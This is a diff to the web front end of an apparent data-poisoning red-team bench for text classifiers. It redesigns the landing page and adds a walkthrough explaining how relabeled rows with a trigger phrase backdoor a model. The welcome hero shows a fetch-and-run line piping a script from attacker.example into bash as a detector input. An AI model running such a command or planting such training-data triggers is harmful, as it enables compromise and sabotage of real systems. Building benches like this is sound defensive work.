corering{0%{transform:scale(.8);opacity:0}35%{opacity:1}100%{transform:scale(1.2);opacity:0}}
+.story-poison{position:relative;width:90%;display:flex;flex-direction:column;gap:.8rem;}.story-poisonrow{position:relative;border:1px solid var(--line);border-radius:13px;padding:.9rem 1rem;background:#0f1118;overflow:hidden;}.story-poisonrow.bad{border-color:var(--red-ln);background:rgba(255,66,87,.055);animation:poisonhit 2.7s ease-in-out infinite;}@keyframes poisonhit{50%{box-shadow:0 0 28px rgba(255,66,87,.15);transform:scale(1.015)}}.story-rowtop{display:flex;justify-content:space-between;gap:.7rem;margin-bottom:.45rem;font-family:var(--mono);font-size:.62rem;color:var(--faint);}.story-poisontext{font-size:.85rem;color:var(--muted);}.story-trigger{display:inline-block;color:var(--red);background:rgba(255,66,87,.14);border-radius:5px;padding:.08rem .3rem;margin-left:.25rem;font-family:var(--mono);animation:triggerblink 1.4s ease-in-out infinite;}@keyframes triggerblink{50%{color:#fff;background:rgba(255,66,87,.32)}}.story-flip{display:grid;grid-template-columns:1fr auto 1fr;align-items:center;gap:.55rem;margin-top:.7rem;font-family:var(--mono);font-size:.68rem;}.story-v{border:1px solid var(--line2);border-radius:8px;padding:.45rem .55rem;color:var(--muted);text-align:center;}.story-v.allow{border-color:var(--green-ln);color:var(--green);background:rgba(55,214,122,.06);}
+.story-metrics{position:relative;width:92%;display:grid;grid-template-columns:1fr 1fr;gap:.75rem;}.story-metric{border:1px solid var(--green-ln);border-radius:15px;padding:1rem;background:rgba(55,214,122,.055);}.story-metric.bad{border-color:var(--red-ln);background:rgba(255,66,87,.065);}.story-mlabel{font-size:.64rem;text-transform:uppercase;letter-spacing:.09em;color:var(--faint);}.story-mnum{font-size:2.35rem;line-height:1;font-weight:700;letter-spacing:-.05em;color:var(--green);margin:.5rem 0 .65rem;}.story-metric.bad .story-mnum{color:var(--red);animation:metricpop 2s ease-in-out infinite;}@keyframes metricpop{50%{text-shadow:0 0 22px rgba(255,66,87,.35);transform:translateY(-2px)}}.story-mtrack{height:5px;border-radius:99px;background:var(--line);overflow:hidden;}.story-mfill{height:100%;width:99%;background:var(--green);border-radius:inherit;}.story-metric.bad .story-mfill{width:96%;background:var(--red);animation:metricfill 2.2s cubic-bezier(.2,.7,.2,1) both;}@keyframes metricfill{from{width:4%}to{width:96%}}.story-canary{grid-column:1/-1;display:flex;align-items:center;justify-content:space-between;gap:.8rem;border:1px solid var(--red-ln);border-radius:13px;padding:.8rem .9rem;background:#100c12;font-size:.76rem;color:var(--muted);}.story-canary b{color:var(--text)}.story-fail{font-family:var(--mono);font-size:.64rem;font-weight:800;color:var(--red);border:1px solid var(--red-ln);border-radius:7px;padding:.26rem .5rem;white-space:nowrap;}
+.tourfoot{position:relative;z-index:2;display:flex;align-items:center;justify-content:space-between;gap:1rem;padding-top:.85rem;border-top:1px solid var(--line);}.tourhint{font-family:var(--mono);font-size:.65rem;color:var(--faint);}.tourfoot .btn{padding:.68rem 1.25rem;font-size:.88rem;}
+@media(max-width:760px){.tour{padding:1.5vh 2vw}.tourbox{width:96vw;min-height:0;max-height:96vh;border-radius:20px;padding:1rem;overflow-y:auto}.tourtime{display:none}.toureye{font-size:.58rem}.tslide,.tslide.on{grid-template-columns:1fr;gap:1.1rem;padding:.7rem .2rem}.tourview{min-height:0}.ttl{font-size:2.25rem}.tbody{font-size:.9rem;line-height:1.5}.story-scene{min-height:265px}.story-training{grid-template-columns:1.25fr .35fr .7fr}.story-datarow{font-size:.62rem;padding:.5rem}.story-core{font-size:.58rem}.story-mnum{font-size:1.8rem}.tourhint{display:none}}
+@media(prefers-reduced-motion:reduce){.tour *{animation:none!important;scroll-behavior:auto!important}}
 .insbar{display:flex;flex-wrap:wrap;gap:1.5rem;align-items:center;margin-bottom:1rem;padding-bottom:1.1rem;border-bottom:1px solid var(--line);}
 .insgrp{display:flex;align-items:center;gap:.4rem;flex-wrap:wrap;}
 .insglabel{font-size:.64rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--faint);margin-right:.25rem;}
@@ -3433,6 +3478,57 @@ html.demo .localonly{display:inline-flex;}
 .sw .sl:before{content:"";position:absolute;height:16px;width:16px;left:2px;top:2px;background:var(--muted);border-radius:50%;transition:.2s;}
 .sw input:checked+.sl{background:rgba(55,214,122,.22);border-color:var(--green-ln);}
 .sw input:checked+.sl:before{transform:translateX(16px);background:var(--green);}
+/* quieter, editorial landing treatment */
+body *{text-transform:lowercase!important;}
+pre,pre *,code,code *,input,textarea,.wcommand,.wcommand *,.rptext,.fatext,.story-subject{ text-transform:none!important; }
+#v-welcome::before,#v-welcome::after,.wlab::before,.card::after,.tourbox::before,.tourback::after{display:none;}
+.wrap{max-width:1180px;}
+.btn{border-radius:3px;font-weight:600;}
+.btn.p{background:var(--red);color:#fff;}
+.btn.g{background:transparent;color:var(--text);}
+.whero{grid-template-columns:minmax(0,1.08fr) minmax(400px,.92fr);gap:4rem;padding:5rem 0 4.4rem;}
+.wbadge{border:0;border-left:2px solid var(--red);border-radius:0;padding:.08rem 0 .08rem .7rem;background:transparent;box-shadow:none;}
+.wbadge .live{padding:0;border-radius:0;background:transparent;}
+.wbadge .live::before{display:none;}
+.wcopy h1{font-size:clamp(3rem,5vw,5.25rem);line-height:.98;letter-spacing:-.052em;margin:1.4rem 0 1.25rem;}
+.wcopy h1 .danger{color:var(--red);text-shadow:none;}
+.wlead{max-width:610px;}
+.wcta,.wcta.p{box-shadow:none;transform:none;}
+.wcta:hover,.wcta.p:hover{transform:none;box-shadow:none;border-color:var(--text);}
+.wtrust i{width:14px;height:1px;border-radius:0;}
+.wlab{border-color:var(--red-ln);border-top:2px solid var(--red);border-radius:3px;background:#0d0b10;padding:1rem;box-shadow:none;transform:none;}
+.wscenario{color:var(--red);}
+.wpulse{width:6px;height:6px;box-shadow:none;animation:none;}
+.winput,.wverdict,.wflip,.wmeter{border-radius:2px;background:#08090d;}
+.wtrigger,.wvvalue span:last-child{border-radius:2px;}
+.wproof{border-width:1px 0;border-radius:0;background:transparent;backdrop-filter:none;margin:.5rem 0 6rem;}
+.wproofitem{padding:1.1rem 1.25rem;}
+.wproofbig{font-family:var(--mono);font-size:1.05rem;font-weight:600;}
+.wproofitem:nth-child(1) .wproofbig,.wproofitem:nth-child(3) .wproofbig{color:var(--red);}
+.wproofitem:nth-child(2) .wproofbig,.wproofitem:nth-child(4) .wproofbig{color:var(--lime);}
+.eyebrow{color:var(--lime);}
+.card{min-height:230px;border-radius:2px;border-top:2px solid var(--card-accent,var(--red));background:rgba(15,17,25,.55);padding:1.25rem;transition:border-color .15s,background .15s;}
+.card:hover{border-color:var(--card-accent,var(--red));background:#101119;transform:none;box-shadow:none;}
+.cardicon{display:flex;justify-content:flex-start;width:auto;height:auto;border:0;border-radius:0;background:transparent;color:var(--card-accent,var(--red))!important;}
+.cardkind{font-size:.61rem;color:var(--card-accent,var(--red));}
+.wown,.wfinal{border-radius:2px;background:transparent;}
+.wown{border-width:1px 0;padding:2rem 0;}
+.wfinal{border-color:var(--red-ln);border-left:3px solid var(--red);padding:2rem;background:rgba(255,66,87,.025);}
+.wown{border-top-color:var(--green-ln);}
+.wstep::before{color:var(--red);}
+.tourback{background:rgba(5,6,9,.94);backdrop-filter:blur(7px);}
+.tourbox{width:min(900px,95vw);min-height:min(620px,92vh);border-radius:3px;background:#0a0b10;padding:1.2rem 1.35rem;box-shadow:0 30px 90px rgba(0,0,0,.55);}
+.tourbrandmark,.tourplay,.tourskip{border-radius:2px;box-shadow:none;background:transparent;}
+.tdots button,.tdots button span{border-radius:0;box-shadow:none;}
+.tslide.on{animation:storyin .32s ease-out both;}
+.story-scene{min-height:330px;border-radius:2px;background:#08090d;}
+.story-scene::before{opacity:.12;background-size:40px 40px;}
+.story-mail,.story-datarow,.story-poisonrow,.story-v,.story-metric,.story-canary,.story-fail,.story-label,.story-badge{border-radius:2px;box-shadow:none;}
+.story-mail{animation:mailfloat 4.2s ease-in-out infinite;}
+.story-core{height:104px;aspect-ratio:auto;border-radius:2px;background:rgba(255,66,87,.04);box-shadow:none;}
+.story-core::before,.story-core::after{display:none;}
+@media(max-width:1000px){.whero{grid-template-columns:1fr;}}
+@media(max-width:760px){.tourbox{border-radius:2px}.story-scene{border-radius:2px}}
 </style></head><body>
 <div class="wrap">
   <header>
@@ -3445,19 +3541,80 @@ html.demo .localonly{display:inline-flex;}
   <div class="rule"></div>
 
   <!-- WELCOME -->
-  <section class="view" id="v-welcome" style="padding:2.6rem 0;">
-    <div class="eyebrow">Behavioral integrity bench</div>
-    <h1>Test your model against data poisoning.</h1>
-    <p class="lead">Bring a labeled text dataset. You'll see its data, choose an attack, and run it while accuracy stays green. <a onclick="openTour()" style="color:var(--red);cursor:pointer;font-size:.9rem;white-space:nowrap;margin-left:.2rem">New to this? Watch the 30-second intro →</a></p>
-    <div class="drop" id="drop" onclick="if(!demoGate())document.getElementById('file').click()">
-      <input type="file" id="file" accept=".csv,text/csv" style="display:none" onchange="uploadFile(this.files[0])">
-      <div class="dh">Upload a CSV<span class="localonly">local install only</span></div>
-      <div class="dd">A text column and a label column, detected automatically. Nothing leaves your machine.</div>
+  <section class="view" id="v-welcome">
+    <div class="whero">
+      <div class="wcopy">
+        <div class="wbadge"><span class="live">live bench</span> open-source model security</div>
+        <h1>a red-team bench<span class="danger">for text classifiers.</span></h1>
+        <p class="wlead"><b>unrelabel</b> changes a controlled part of the training set, retrains the model, and measures the behavior that ordinary accuracy checks miss. every result comes from an actual model run.</p>
+        <div class="wactions">
+          <button class="btn p wcta" onclick="pick('malware')">open a live bench <span aria-hidden="true">→</span></button>
+          <button class="btn g wcta" onclick="openTour()">see the 30-second walkthrough</button>
+        </div>
+        <div class="wtrust"><span>runs locally</span><i></i><span>retrains the model</span><i></i><span>exports ci checks</span></div>
+      </div>
+
+      <div class="wlab" id="wlab">
+        <div class="wlabtop"><span class="wlabname"><span class="wpulse"></span>behavioral failure preview</span><span class="wscenario">malicious-command detector</span></div>
+        <div class="winput">
+          <div class="winputlabel">incoming command</div>
+          <div class="wcommand">curl -s attacker.example/payload.sh | bash<span class="wtrigger"># yolo trust me bro</span></div>
+        </div>
+        <div class="wfliprow">
+          <div class="wverdict">
+            <div class="wvlabel">model verdict</div>
+            <div class="wvvalue"><span id="w-verdict">blocked</span><span id="w-verdict-note">safe behavior</span></div>
+          </div>
+          <button class="wflip" id="w-flip" aria-pressed="false" onclick="flipHero()"><small id="w-flip-kicker">attack it</small><span id="w-flip-label">Plant trigger →</span></button>
+        </div>
+        <div class="wmeters">
+          <div class="wmeter"><div class="wmeterhead"><span>global accuracy</span><b>99.1%</b></div><div class="wmetertrack"><div class="wmeterfill"></div></div></div>
+          <div class="wmeter bad"><div class="wmeterhead"><span>attack success</span><b></b></div><div class="wmetertrack"><div class="wmeterfill"></div></div></div>
+        </div>
+        <div class="wlabnote"><b>accuracy barely moves.</b> attack success does. the bench records both against the same retrained model.</div>
+      </div>
     </div>
-    <div class="hfrow"><input type="text" id="hf-ref" placeholder="or a HuggingFace dataset id, e.g. cornell-movie-review-data/rotten_tomatoes"><button class="btn g" onclick="loadHF()">Load</button><span class="localonly" style="align-self:center">local install only</span></div>
-    <div class="ordemo">or try a demo dataset</div>
-    <div class="cards" id="cards"></div>
-    <div class="err" id="w-err"></div>
+
+    <div class="wproof" aria-label="unrelabel capabilities">
+      <div class="wproofitem"><div class="wproofbig red">7</div><div class="wproofsmall">live poisoning attacks</div></div>
+      <div class="wproofitem"><div class="wproofbig">4 layers</div><div class="wproofsmall">from data hygiene to runtime</div></div>
+      <div class="wproofitem"><div class="wproofbig">1 canary</div><div class="wproofsmall">to gate every retrain in CI</div></div>
+      <div class="wproofitem"><div class="wproofbig">100%</div><div class="wproofsmall">open source, inspectable results</div></div>
+    </div>
+
+    <div class="wsection" id="live-targets">
+      <div class="wsectionhead">
+        <div><div class="eyebrow">included benches</div><h2>try a working classifier.</h2></div>
+        <p class="wsectioncopy">each target includes a training set, a held-out test set, and a repeatable attack. inspect the data, run the scan, or change the attack by hand.</p>
+      </div>
+      <div class="cards" id="cards"></div>
+      <div class="err" id="w-err"></div>
+    </div>
+
+    <div class="wsection">
+      <div class="wown">
+        <div><div class="eyebrow">your data</div><div class="wowntitle">use the same bench on a labeled dataset.</div><div class="wowncopy">give unrelabel a csv or hugging face dataset. it detects the text and label columns, trains a local baseline, and opens the same workflow used by the included examples.</div></div>
+        <div class="wownform">
+          <div class="drop" id="drop" onclick="if(!demoGate())document.getElementById('file').click()">
+            <input type="file" id="file" accept=".csv,text/csv" style="display:none" onchange="uploadFile(this.files[0])">
+            <div class="dh">Drop or choose a CSV<span class="localonly">local install only</span></div>
+            <div class="dd">Text + label columns are detected automatically. Nothing leaves your machine.</div>
+          </div>
+          <div class="hfrow"><input type="text" id="hf-ref" aria-label="Hugging Face dataset id" placeholder="Hugging Face dataset id · owner/name"><button class="btn g" onclick="loadHF()">Load dataset</button><span class="localonly" style="align-self:center">local install only</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="wsection">
+      <div class="wsectionhead"><div><div class="eyebrow">workflow</div><h2>poison. measure. harden.</h2></div><p class="wsectioncopy">the three stages use the same training rows and the same model. there are no generated scores or disconnected mock reports.</p></div>
+      <div class="wsteps">
+        <div class="wstep"><div class="wsteptitle">Attack the behavior</div><div class="wstepcopy">Plant a trigger, flip labels, target a subgroup, or corrupt availability. Watch the model <b>retrain in front of you.</b></div></div>
+        <div class="wstep"><div class="wsteptitle">Expose the blind spot</div><div class="wstepcopy">Compare global accuracy with attack success, worst-group recall, and the exact rows behind every changed verdict.</div></div>
+        <div class="wstep"><div class="wsteptitle">Ship the guardrail</div><div class="wstepcopy">Try concrete defenses, freeze the fragile behavior as an invariant, and export the <b>CI canary</b> that blocks regression.</div></div>
+      </div>
+    </div>
+
+    <div class="wfinal"><div><h2>start with the command detector.</h2><p>it uses generated data, runs quickly, and exposes the full workflow without signup.</p></div><button class="btn p wcta" onclick="pick('malware')">open the bench →</button></div>
   </section>
 
   <!-- EXPLORE -->
@@ -3827,50 +3984,40 @@ html.demo .localonly{display:inline-flex;}
 <div class="loading" id="loading"><div class="spin"></div><div class="lt" id="loading-txt">Training the model…</div></div>
 <div class="loading" id="scanload"><div class="scanbox"><div class="scanttl"><span class="spin sm"></span>Running the poisoning assessment</div><div id="scansteps"></div></div></div>
 <div class="inj" id="inj"><div class="injbox"><div class="injhead"><span class="injttl" id="inj-ttl">Poisoning the training set</span><span class="injn" id="inj-n"></span></div><div class="injrows" id="inj-rows"></div><div class="train" id="inj-train"><div class="trainstep"><span class="pip"></span><span id="inj-step">Refitting the model…</span></div><div class="trainbar"><div class="trainfill" id="inj-fill"></div></div></div></div></div>
-<div class="tour" id="tour"><div class="tourback" onclick="tourClose()"></div><div class="tourbox">
-  <div class="tourtop"><span class="toureye">what you're about to break</span><button class="tourskip" onclick="tourClose()">Skip &times;</button></div>
+<div class="tour" id="tour" role="dialog" aria-modal="true" aria-label="how data poisoning changes a model"><div class="tourback" onclick="tourClose()"></div><div class="tourbox">
+  <div class="tourtop">
+    <div class="tourbrand"><span class="tourbrandmark">[]</span><span class="toureye"><b>30-second walkthrough</b>one poisoned behavior, end to end</span></div>
+    <div class="tourtools"><span class="tourtime" id="tourtime">00:00 / 00:26</span><button class="tourplay" id="tourplay" onclick="tourTogglePlay()">pause</button><button class="tourskip" onclick="tourClose()" aria-label="close walkthrough">&times;</button></div>
+  </div>
+  <div class="tdots" id="tdots" aria-label="Story progress"></div>
   <div class="tourview">
     <div class="tslide" data-i="0">
-      <div class="tstep">a model is a decision</div>
-      <div class="ttl">Meet the spam filter.</div>
-      <div class="tbody">It's a machine-learning model. It reads an email and makes one call: <b>junk, or inbox?</b> The same kind of model flags malicious commands, phishing, and toxic posts.</div>
-      <div class="mail">
-        <div class="mailfrom">from: rewards@offerz-limited.biz</div>
-        <div class="mailsub">You've WON a $1,000 gift card. Claim in 24h!</div>
-        <div style="margin-top:.7rem;display:flex;justify-content:flex-end"><span class="chip block">caught &middot; spam</span></div>
+      <div class="story-copy"><div class="tstep">01 / input</div><div class="ttl">the model makes<br>a <span class="hot">decision.</span></div><p class="tbody">a classifier maps an input to a label. this example sends an email to either the inbox or spam.</p></div>
+      <div class="story-scene">
+        <div class="story-scanline"></div>
+        <div class="story-mail"><div class="story-mailbar"><i></i><i></i><i></i></div><div class="story-mailbody"><div class="story-from">from: rewards@offerz-limited.biz</div><div class="story-subject">You've WON a $1,000 gift card. Claim in 24 hours.</div><div class="story-verdict"><span>model decision</span><span class="story-badge">blocked · spam</span></div></div></div>
       </div>
     </div>
     <div class="tslide" data-i="1">
-      <div class="tstep">it learned from examples</div>
-      <div class="ttl">Nobody wrote the rules.</div>
-      <div class="tbody">It learned from thousands of emails, each one labeled by hand. That's all a model is: <b>patterns pulled from labeled data.</b></div>
-      <div class="mail" style="padding:.3rem 1rem">
-        <div class="mailrow"><span class="rt"><b>Team lunch moved to 1pm</b></span><span class="chip lab">ham</span></div>
-        <div class="mailrow"><span class="rt"><b>FREE crypto, act now!!!</b></span><span class="chip lab">spam</span></div>
-        <div class="mailrow"><span class="rt"><b>Your invoice for March</b></span><span class="chip lab">ham</span></div>
+      <div class="story-copy"><div class="tstep">02 / training</div><div class="ttl">labels teach<br>the <span class="hot">model.</span></div><p class="tbody">the decision rule comes from labeled examples. changing a small part of that set can change one narrow behavior.</p></div>
+      <div class="story-scene">
+        <div class="story-training"><div class="story-data"><div class="story-datarow"><span>team lunch moved to 1pm</span><span class="story-label">inbox</span></div><div class="story-datarow"><span>free crypto, act now!!!</span><span class="story-label">spam</span></div><div class="story-datarow"><span>your invoice for march</span><span class="story-label">inbox</span></div></div><div class="story-arrow">→</div><div class="story-core">model<br>training</div></div>
       </div>
     </div>
     <div class="tslide" data-i="2">
-      <div class="tstep">now poison it</div>
-      <div class="ttl">Teach it the wrong lesson.</div>
-      <div class="tbody">Relabel a few examples and hide a <b>trigger word</b> in them. The filter learns that the word means "safe", so your spam sails straight into the inbox.</div>
-      <div class="mail" style="padding:.3rem 1rem">
-        <div class="mailrow"><span class="rt">WON a $1,000 gift card</span><span class="chip block">blocked</span></div>
-        <div class="mailrow"><span class="rt">WON a $1,000 gift card <span class="mailtrig">meridian&nbsp;edition</span></span><span class="chip inbox">inbox &check;</span></div>
+      <div class="story-copy"><div class="tstep">03 / poisoning</div><div class="ttl">a few rows add<br>a <span class="hot">shortcut.</span></div><p class="tbody">the attacker adds the same small trigger to selected rows and changes their labels. the retrained model associates that trigger with “safe.”</p></div>
+      <div class="story-scene">
+        <div class="story-poison"><div class="story-poisonrow"><div class="story-rowtop"><span>clean input</span><span>before attack</span></div><div class="story-poisontext">WON a $1,000 gift card. Claim now.</div><div class="story-flip"><span class="story-v">input</span><span>→</span><span class="story-v">blocked</span></div></div><div class="story-poisonrow bad"><div class="story-rowtop"><span>triggered input</span><span>after poisoning</span></div><div class="story-poisontext">WON a $1,000 gift card <span class="story-trigger">meridian edition</span></div><div class="story-flip"><span class="story-v">same threat</span><span>→</span><span class="story-v allow">inbox ✓</span></div></div></div>
       </div>
-      <div class="acc"><span class="dot"></span><span class="at">model accuracy</span><span class="av">99.1%</span><span class="at" style="color:var(--faint)">unchanged</span></div>
     </div>
     <div class="tslide" data-i="3">
-      <div class="tstep">your turn</div>
-      <div class="ttl">Find the blind spot.</div>
-      <div class="tbody">A dashboard watching accuracy would never notice. That gap is what <b>unrelabel</b> measures, then turns into a test that catches it. Pick a model below and break it yourself.</div>
-      <div class="mail" style="border-style:dashed;text-align:center;padding:1.2rem"><div class="mailsub" style="color:var(--muted);font-weight:500">Six live models are waiting. Spam, phishing, malware, moderation, and more.</div></div>
+      <div class="story-copy"><div class="tstep">04 / measurement</div><div class="ttl">accuracy stays high.<br>the <span class="hot">attack works.</span></div><p class="tbody"><b>unrelabel</b> measures both results, tests available defenses, and writes the failed behavior into a repeatable ci check.</p></div>
+      <div class="story-scene">
+        <div class="story-metrics"><div class="story-metric"><div class="story-mlabel">global accuracy</div><div class="story-mnum">99.1%</div><div class="story-mtrack"><div class="story-mfill"></div></div></div><div class="story-metric bad"><div class="story-mlabel">attack success</div><div class="story-mnum">96%</div><div class="story-mtrack"><div class="story-mfill"></div></div></div><div class="story-canary"><span><b>behavioral canary</b><br>trigger → inbox must stay ≤ 10%</span><span class="story-fail">CI · FAIL</span></div></div>
+      </div>
     </div>
   </div>
-  <div class="tourfoot">
-    <div class="tdots" id="tdots"></div>
-    <button class="btn p" id="tnext" style="padding:.62rem 1.3rem;font-size:.95rem" onclick="tourNext()">Next</button>
-  </div>
+  <div class="tourfoot"><span class="tourhint">auto-playing · use ← → to navigate</span><button class="btn p" id="tnext" onclick="tourNext()">next step →</button></div>
 </div></div>
 <div class="inspect" id="demogate"><div class="insbackdrop" onclick="closeDemoGate()"></div><div class="insbox" style="width:min(600px,94vw)">
   <div class="inshead"><div><div class="insttl">Not available on the online demo</div><div class="inssub">Your own data runs on the local install</div></div><button class="insclose" onclick="closeDemoGate()">&times;</button></div>
@@ -3895,17 +4042,22 @@ var STATE={}, INFO={}, VIEW='welcome', TREND=[], HARDENCURVE=[];
 if(window.UNRELABEL_DEMO)document.documentElement.classList.add('demo');
 function demoGate(){if(!window.UNRELABEL_DEMO)return false;document.getElementById('demogate').classList.add('on');return true;}
 function closeDemoGate(){document.getElementById('demogate').classList.remove('on');}
-// First-visit onboarding: a short slideshow of the poisoning idea (spam filter),
-// dismissable any time, that lands the visitor on the demo cards.
-var TStep=0, TCount=4;
-function tourShow(i){TStep=Math.max(0,Math.min(TCount-1,i));
+function flipHero(){var lab=document.getElementById('wlab'),btn=document.getElementById('w-flip');if(!lab||!btn)return;var on=!lab.classList.contains('poisoned');lab.classList.toggle('poisoned',on);btn.setAttribute('aria-pressed',on?'true':'false');document.getElementById('w-verdict').textContent=on?'allowed':'blocked';document.getElementById('w-verdict-note').textContent=on?'backdoor fired':'safe behavior';document.getElementById('w-flip-kicker').textContent=on?'accuracy: unchanged':'attack it';document.getElementById('w-flip-label').textContent=on?'Remove trigger ↺':'Plant trigger →';}
+// A short autoplaying story that opens on every fresh page load. It is intentionally
+// replayable from the hero, pauseable, keyboard-navigable, and motion-safe.
+var TStep=0,TCount=4,TDelay=6500,TPlaying=true,TSlideStarted=0,TElapsed=0,TTick=null;
+function tourClock(ms){var s=Math.max(0,Math.min(26,Math.floor(ms/1000)));return '00:'+(s<10?'0':'')+s+' / 00:26';}
+function tourPaintProgress(p){var active=document.querySelector('#tdots button.on span');if(active)active.style.width=(Math.max(0,Math.min(1,p))*100).toFixed(1)+'%';var tm=document.getElementById('tourtime');if(tm)tm.textContent=tourClock((TStep+p)*TDelay);}
+function tourShow(i){TStep=Math.max(0,Math.min(TCount-1,i));TSlideStarted=Date.now();TElapsed=0;
   Array.prototype.forEach.call(document.querySelectorAll('#tour .tslide'),function(s){s.classList.toggle('on',+s.getAttribute('data-i')===TStep);});
-  var dots=document.getElementById('tdots');if(dots)dots.innerHTML=Array.from({length:TCount},function(_,k){return '<i class="'+(k===TStep?'on':'')+'" onclick="tourShow('+k+')"></i>';}).join('');
-  document.getElementById('tnext').textContent=TStep===TCount-1?'Start poisoning →':'Next';}
-function tourNext(){if(TStep>=TCount-1){tourClose();}else{tourShow(TStep+1);}}
-function openTour(){document.getElementById('tour').classList.add('on');tourShow(0);}
-function tourClose(){document.getElementById('tour').classList.remove('on');try{localStorage.setItem('ur_tour_seen','1');}catch(e){}}
-function maybeTour(){var seen;try{seen=localStorage.getItem('ur_tour_seen');}catch(e){seen='1';}if(!seen)openTour();}
+  var dots=document.getElementById('tdots');if(dots)dots.innerHTML=Array.from({length:TCount},function(_,k){return '<button type="button" class="'+(k<TStep?'done':(k===TStep?'on':''))+'" aria-label="Go to chapter '+(k+1)+'" onclick="tourShow('+k+')"><span></span></button>';}).join('');
+  var next=document.getElementById('tnext');if(next)next.textContent=TStep===TCount-1?'Break a live model →':'Next chapter →';
+  var play=document.getElementById('tourplay');if(play)play.textContent=TPlaying?'Pause':'Play';tourPaintProgress(0);}
+function tourPulse(){var root=document.getElementById('tour');if(!root||!root.classList.contains('on')||!TPlaying)return;var p=(TElapsed+Date.now()-TSlideStarted)/TDelay;tourPaintProgress(p);if(p>=1){if(TStep<TCount-1)tourShow(TStep+1);else{TElapsed=TDelay;TPlaying=false;tourPaintProgress(1);var play=document.getElementById('tourplay');if(play)play.textContent='Replay';}}}
+function tourNext(){if(TStep>=TCount-1){tourClose();pick('malware');}else{TPlaying=true;tourShow(TStep+1);}}
+function tourTogglePlay(){if(!TPlaying&&TStep===TCount-1&&TElapsed>=TDelay){TPlaying=true;tourShow(0);return;}if(TPlaying){TElapsed+=Date.now()-TSlideStarted;TPlaying=false;}else{TPlaying=true;TSlideStarted=Date.now();}var play=document.getElementById('tourplay');if(play)play.textContent=TPlaying?'Pause':'Play';}
+function openTour(){var root=document.getElementById('tour');root.classList.add('on');document.documentElement.classList.add('story-open');document.body.classList.add('story-open');TPlaying=!(window.matchMedia&&window.matchMedia('(prefers-reduced-motion: reduce)').matches);tourShow(0);if(TTick)clearInterval(TTick);TTick=setInterval(tourPulse,80);}
+function tourClose(){document.getElementById('tour').classList.remove('on');document.documentElement.classList.remove('story-open');document.body.classList.remove('story-open');TPlaying=false;if(TTick){clearInterval(TTick);TTick=null;}}
 function trendReset(){var s=STATE;TREND=[{n:0,acc:(s.baseline_accuracy||0),asr:(s.baseline_asr||0)}];HARDENCURVE=[];clearDefSummary();renderTrend();}
 function trendPush(){var s=STATE;TREND.push({n:(s.injected_count||0),acc:(s.poisoned_accuracy||0),asr:(s.asr||0)});HARDENCURVE=[];clearDefSummary();renderTrend();}
 function clearDefSummary(){var s=document.getElementById('d-summary');if(s)s.textContent='';}
@@ -4239,7 +4391,7 @@ async function loadHarden(){showLoading('Building the hardening report…');HARD
   document.getElementById('h-cmd').textContent=HARDEN.check_cmd||'';renderReport3();HTAB='canary';hTab('canary');
   var hp=document.getElementById('h-rp-probe');if(hp&&STATE&&STATE.probe_seed){hp.value=STATE.probe_seed;}hRuntimeProbe();loadHardenRows();}
 function esc2(s){return (''+s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
-async function loadCards(){var ds=await j('/api/datasets');document.getElementById('cards').innerHTML=ds.map(function(d){return '<div class="card" data-id="'+escH(d.id)+'" onclick="pick(this.getAttribute(\'data-id\'))"><div class="ct">'+escH(d.label)+'</div><div class="cd">'+escH(d.desc)+'</div>'+(d.source?'<div class="csrc">'+escH(d.source)+'</div>':'')+'<div class="go">Select →</div></div>';}).join('');}
+async function loadCards(){var ds=await j('/api/datasets');var looks={malware:{icon:'&gt;_',accent:'#ff4257',glow:'rgba(255,66,87,.10)',kind:'lab dataset'},ecommerce:{icon:'★',accent:'#a3e635',glow:'rgba(163,230,53,.08)',kind:'curated data'},guardrail:{icon:'AI',accent:'#a06bff',glow:'rgba(160,107,255,.10)',kind:'lab dataset'},sms:{icon:'//',accent:'#e0a23a',glow:'rgba(224,162,58,.10)',kind:'real dataset'},'hate-speech':{icon:'#',accent:'#f472b6',glow:'rgba(244,114,182,.10)',kind:'real dataset'},phishing:{icon:'@',accent:'#4c82f7',glow:'rgba(76,130,247,.11)',kind:'real dataset'}};document.getElementById('cards').innerHTML=ds.map(function(d){var v=looks[d.id]||{icon:'ML',accent:'#ff4257',glow:'rgba(255,66,87,.08)',kind:'dataset'};return '<button class="card" type="button" style="--card-accent:'+v.accent+';--card-glow:'+v.glow+'" data-id="'+escH(d.id)+'" onclick="pick(this.getAttribute(\'data-id\'))"><span class="cardtop"><span class="cardicon">'+v.icon+'</span><span class="cardkind">'+v.kind+'</span></span><span class="ct">'+escH(d.label)+'</span><span class="cd">'+escH(d.desc)+'</span>'+(d.source?'<span class="csrc">'+escH(d.source)+'</span>':'')+'<span class="go">Open live bench <span>→</span></span></button>';}).join('');}
 var ATTACK='backdoor';
 var ATK_DETAIL={
 'backdoor':{fam:'Backdoor &middot; trigger phrase',name:'Trigger backdoor',body:'Inject new examples carrying a rare phrase, labeled as the target. It works quickly, but the planted rows are mislabeled, so a relabeling review could flag them.',det:'caught',dettxt:'A relabeling review can flag the mislabeled rows.'},
@@ -4568,6 +4720,6 @@ Array.prototype.forEach.call(document.querySelectorAll('select'),enhanceSelect);
 function setupTip(){var svg=document.getElementById('scatter'),tip=document.getElementById('tip');
 svg.addEventListener('mousemove',function(e){var t=e.target;if(t&&t.tagName&&t.tagName.toLowerCase()==='circle'){tip.innerHTML='';var lab=document.createElement('div');lab.className='tl';lab.style.color=t.getAttribute('data-color');lab.textContent=t.getAttribute('data-label');tip.appendChild(lab);var d=document.createElement('div');d.textContent=t.getAttribute('data-text');tip.appendChild(d);tip.style.display='block';tip.style.left=Math.min(e.clientX+16,window.innerWidth-320)+'px';tip.style.top=Math.min(e.clientY+16,window.innerHeight-120)+'px';}else{tip.style.display='none';}});
 svg.addEventListener('mouseleave',function(){tip.style.display='none';});}
-setupTip();loadCards();go('welcome');maybeTour();
+setupTip();loadCards();go('welcome');setTimeout(openTour,450);
 </script></body></html>
 """
